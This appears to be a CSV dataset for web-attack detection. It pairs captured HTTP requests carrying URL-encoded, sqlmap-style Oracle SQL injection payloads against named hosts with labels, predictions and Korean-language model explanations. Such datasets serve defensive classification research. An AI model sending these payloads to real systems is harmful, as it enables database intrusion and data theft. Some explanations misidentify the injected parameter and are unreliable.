Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
23620,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=-7820%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%2865%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%2870%29%7C%7CCHR%28105%29%7C%7CCHR%28114%29%7C%7CCHR%28105%29%7C%7CCHR%2879%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20- HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"해당 Payload는 SQL Injection 공격을 시도한 것으로 보입니다. 

- 공격 여부(0:비공격, 1:공격) : 1 (공격)
- 공격 구문 : GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=-7820%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28102%29%7C%7CCHR%2865%29%7C%7CCHR%2874%29%7C%7CCHR%2880%29%7C%7CCHR%2870%29%7C%7CCHR%28105%29%7C%7CCHR%28114%29%7C%7CCHR%28105%29%7C%7CCHR%2879%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-
- 공격 유형 : SQL Injection
- 이유 : Payload에서 UNION ALL SELECT 문을 사용하여 데이터베이스에 쿼리를 주입하려고 시도하고 있습니다. 이를 통해 공격자는 데이터베이스에 액세스하고 데이터를 조작할 수 있습니다."
19438,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%22%20AND%206371%3DCTXSYS.DRITHSX.SN%286371%2C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286371%3D6371%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%22HOsa%22%20LIKE%20%22HOsa&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%22%20AND%206371%3DCTXSYS.DRITHSX.SN%286371%2C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286371%3D6371%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29%20AND%20%22HOsa%22%20LIKE%20%22HOsa&per_page= HTTP/1.1
공격 유형 : SQL Injection (SQL 인젝션)
이유 : GET 요청의 URL 파라미터(search_val)에 SQL Injection 공격 코드가 포함되어 있음. 이를 통해 데이터베이스에 대한 악의적인 쿼리를 실행할 수 있으며 시스템을 해킹하거나 민감한 정보를 유출할 수 있음."
12484,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=%27%7C%7C%28SELECT%20%27oNnZ%27%20FROM%20DUAL%20WHERE%203155%3D3155%20AND%209173%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289173%3D9173%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%29%7C%7C%27 HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : SELECT 문을 이용한 SQL Injection 공격 구문이 포함되어 있습니다.
공격 유형 : SQL Injection
이유 : URL의 f_content_num 파라미터에 SQL Injection 공격을 시도하는 코드가 포함되어 있습니다. 이를 통해 악의적인 사용자가 데이터베이스에 액세스하거나 데이터를 조작할 수 있습니다."
1336,"GET /board.php?gubn=data&curpage=4%27%29%20AND%209635%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289635%3D9635%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27zhAf%27%3D%27zhAf&searchfield=&searchword= HTTP/1.1Accept-Encoding: gzip,deflateHost: 210.124.107.8Accept: */*User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3Connection: closeCache-Control: no-cache",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /board.php?gubn=data&curpage=4%27%29%20AND%209635%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289635%3D9635%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28112%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27zhAf%27%3D%27zhAf&searchfield=&searchword= HTTP/1.1
공격 유형 : SQL Injection
이유 : 해당 요청은 SQL Injection 공격을 시도하는 구문을 포함하고 있습니다. SQL Injection은 악의적인 사용자가 웹 응용프로그램의 보안을 뚫어 데이터베이스를 비정상적으로 조작하거나 민감한 정보를 빼내는 공격 기법 중 하나입니다. 이 구문은 데이터베이스에 대한 쿼리를 변조하여 공격자가 의도한 작업을 수행하도록 설계되었습니다."
2733,"GET /notice/Notice/notice_view/?f_content_num=422%27%20AND%208966%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288966%3D8966%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29--%20uMDA&search_key=&search_val=&per_page= HTTP/1.1Accept-Encoding: gzip,deflateHost: isrc.or.krAccept: */*User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/533.4  (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7Connection: closeCache-Control: no-cache",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /notice/Notice/notice_view/?f_content_num=422%27%20AND%208966%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28120%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288966%3D8966%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29--%20uMDA&search_key=&search_val=&per_page= HTTP/1.1
공격 유형 : SQL Injection (SQL Injection이라고 불리는 이유는 쿼리의 삽입을 통해 데이터베이스를 조작하려는 공격이기 때문이다. 이 경우, URL의 f_content_num 파라미터에 SQL 쿼리가 삽입되어 있어 보인다.)"
20394,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=%27%29%20UNION%20ALL%20SELECT%2080%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2866%29%7C%7CCHR%2888%29%7C%7CCHR%28119%29%7C%7CCHR%28107%29%7C%7CCHR%2868%29%7C%7CCHR%2867%29%7C%7CCHR%2867%29%7C%7CCHR%28104%29%7C%7CCHR%28109%29%7C%7CCHR%2877%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20- HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청 중 'f_content_num' 파라미터에 SQL Injection 공격을 시도하는 UNION ALL SELECT 구문이 포함되어 있습니다. 이를 통해 데이터베이스에 악의적인 쿼리를 주입할 수 있으며, 시스템을 해킹하거나 기밀 정보를 탈취할 수 있습니다."
28811,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=-8556%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2866%29%7C%7CCHR%2887%29%7C%7CCHR%28116%29%7C%7CCHR%2885%29%7C%7CCHR%28113%29%7C%7CCHR%2871%29%7C%7CCHR%2866%29%7C%7CCHR%2867%29%7C%7CCHR%2869%29%7C%7CCHR%2873%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&search_val=&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL 파라미터인 search_key에 SQL Injection 공격 코드가 포함되어 있어, 공격자가 데이터베이스에 악의적인 쿼리를 삽입할 수 있는 가능성이 있습니다."
32128,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=-2088%27%29%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2888%29%7C%7CCHR%2889%29%7C%7CCHR%2888%29%7C%7CCHR%28105%29%7C%7CCHR%2869%29%7C%7CCHR%28116%29%7C%7CCHR%28122%29%7C%7CCHR%2890%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%7C%7CCHR%28102%29%7C%7CCHR%28101%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2897%29%7C%7CCHR%28121%29%7C%7CCHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%28118%29%7C%7CCHR%2879%29%7C%7CCHR%2875%29%7C%7CCHR%28104%29%7C%7CCHR%2898%29%7C%7CCHR%28101%29%7C%7CCHR%2870%29%7C%7CCHR%2888%29%7C%7CCHR%2865%29%7C%7CCHR%2866%29%7C%7CCHR%2870%29%7C%7CCHR%2890%29%7C%7CCHR%2872%29%7C%7CCHR%2875%29%7C%7CCHR%2897%29%7C%7CCHR%2877%29%7C%7CCHR%2886%29%7C%7CCHR%2898%29%7C%7CCHR%2886%29%7C%7CCHR%2877%29%7C%7CCHR%28121%29%7C%7CCHR%28119%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Ch",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1

공격 구문 : GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=-2088%27%29%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2888%29%7C%7CCHR%2889%29%7C%7CCHR%2888%29%7C%7CCHR%28105%29%7C%7CCHR%2869%29%7C%7CCHR%28116%29%7C%7CCHR%28122%29%7C%7CCHR%2890%29%7C%7CCHR%28107%29%7C%7CCHR%2870%29%7C%7CCHR%28102%29%7C%7CCHR%28101%29%7C%7CCHR%28101%29%7C%7CCHR%2884%29%7C%7CCHR%2897%29%7C%7CCHR%28121%29%7C%7CCHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%28118%29%7C%7CCHR%2879%29%7C%7CCHR%2875%29%7C%7CCHR%28104%29%7C%7CCHR%2898%29%7C%7CCHR%28101%7...

공격 유형 : SQL Injection

이유 : GET 요청의 URL 파라미터(search_val)에 SQL Injection 공격 코드가 포함되어 있어, 데이터베이스에 악의적인 SQL 쿼리가 실행될 가능성이 있습니다. SQL Injection은 웹 애플리케이션 취약점 중 하나로, 악의적인 사용자가 입력 폼이나 URL 매개변수 등을 통해 SQL 쿼리를 주입하여 데이터베이스를 조작하거나 민감한 정보를 노출시키는 공격입니다."
10439,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=&per_page=-9637%27%29%20UNION%20ALL%20SELECT%20CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2872%29%7C%7CCHR%28104%29%7C%7CCHR%2867%29%7C%7CCHR%28108%29%7C%7CCHR%2878%29%7C%7CCHR%2885%29%7C%7CCHR%2873%29%7C%7CCHR%2883%29%7C%7CCHR%28121%29%7C%7CCHR%28116%29%7C%7CCHR%28103%29%7C%7CCHR%2885%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%2865%29%7C%7CCHR%28108%29%7C%7CCHR%2877%29%7C%7CCHR%2877%29%7C%7CCHR%2870%29%7C%7CCHR%28115%29%7C%7CCHR%28112%29%7C%7CCHR%28102%29%7C%7CCHR%28103%29%7C%7CCHR%2875%29%7C%7CCHR%2885%29%7C%7CCHR%28109%29%7C%7CCHR%2881%29%7C%7CCHR%2885%29%7C%7CCHR%28117%29%7C%7CCHR%28120%29%7C%7CCHR%2867%29%7C%7CCHR%2868%29%7C%7CCHR%28107%29%7C%7CCHR%2871%29%7C%7CCHR%28114%29%7C%7CCHR%2870%29%7C%7CCHR%28115%29%7C%7CCHR%28109%29%7C%7CCHR%28101%29%7C%7CCHR%2899%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20- HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAcce",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION-based SQL Injection
공격 유형 : 이 공격은 SQL 쿼리를 조작하여 데이터베이스로부터 민감한 정보를 빼내거나 데이터를 변경하는 공격입니다. UNION 구문을 이용하여 여러 쿼리를 조합하여 데이터베이스로부터 정보를 추출하는 것이 특징적입니다. 이 경우, GET 요청의 파라미터를 통해 SQL Injection을 시도하고 있습니다. 이 공격은 사이트의 데이터베이스에 해로운 SQL 코드를 주입하여 실행하려는 시도입니다."
12660,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=-8523%20UNION%20ALL%20SELECT%2080%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%28121%29%7C%7CCHR%2887%29%7C%7CCHR%2881%29%7C%7CCHR%2875%29%7C%7CCHR%2880%29%7C%7CCHR%28122%29%7C%7CCHR%28119%29%7C%7CCHR%28111%29%7C%7CCHR%28117%29%7C%7CCHR%2881%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
이유 : GET 요청의 URL 파라미터에서 UNION ALL SELECT 구문이 사용되었으며, 이는 SQL Injection 공격의 일종으로 악의적인 SQL 쿼리를 주입하여 데이터베이스를 조작하려는 시도를 의미합니다."
28407,"/dvwa/instructions.php?doc=PDF%27%3B%20AND%204111%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284111%3D4111%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=a404e03in9iib68huki3ser6me;security=impossible,",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : /dvwa/instructions.php?doc=PDF%27%3B%20AND%204111%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284111%3D4111%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 sqlmap/1.5.1.40#dev (http://sqlmap.org) PHPSESSID=a404e03in9iib68huki3ser6me;security=impossible
공격 유형 : SQL Injection
이유 : 주어진 Payload에 SQL Injection 공격에 사용되는 코드가 포함되어 있습니다. SQL Injection은 애플리케이션의 보안 취약점을 이용해 공격자가 악의적인 SQL 쿼리를 실행하여 데이터베이스를 조작하거나 민감한 정보를 탈취할 수 있는 공격 유형입니다."
21684,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=-6935%22%29%20AS%20NgJF%20WHERE%209585%3D9585%20OR%207218%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287218%3D7218%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=-6935%22%29%20AS%20NgJF%20WHERE%209585%3D9585%20OR%207218%3DDBMS_UTILITY.SQLID_TO_SQLHASH%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287218%3D7218%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%29--%20&per_page= HTTP/1.1
공격 유형 : SQL Injection (SQL 삽입)
이유 : GET 요청의 URL에 SQL Injection 공격에 사용되는 쿼리가 포함되어 있으며, 이를 통해 악의적인 SQL 쿼리를 실행할 수 있습니다."
985,"GET /notice/Notice/notice_view/?f_content_num=382&search_key=&search_val=%27%29%20UNION%20ALL%20SELECT%2080%2C80%2C80%2C80%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2876%29%7C%7CCHR%28111%29%7C%7CCHR%2872%29%7C%7CCHR%28105%29%7C%7CCHR%28104%29%7C%7CCHR%28102%29%7C%7CCHR%28120%29%7C%7CCHR%2880%29%7C%7CCHR%28115%29%7C%7CCHR%28121%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%2C80%2C80%2C80%2C80%2C80%2C80%2C80%20FROM%20DUAL--%20-&per_page= HTTP/1.1\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nHost: isrc.or.kr\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.358.0 Safari/533.3\r\nAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7\r\nConnection: close\r\nPragma: no-cache\r\nCache-Control: no-cache,no-store",1,SI,,16,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : UNION ALL SELECT
공격 유형 : SQL Injection
해당 페이로드는 SQL Injection 공격을 시도하는 구문으로, UNION ALL SELECT 구문을 사용하여 데이터베이스에 대한 정보를 노출시키려는 시도입니다. 이는 악의적인 공격으로, 데이터베이스에 대한 민감한 정보를 탈취하거나 조작할 수 있는 위험이 있습니다. 따라서 이러한 페이로드는 공격으로 간주되어야 합니다."
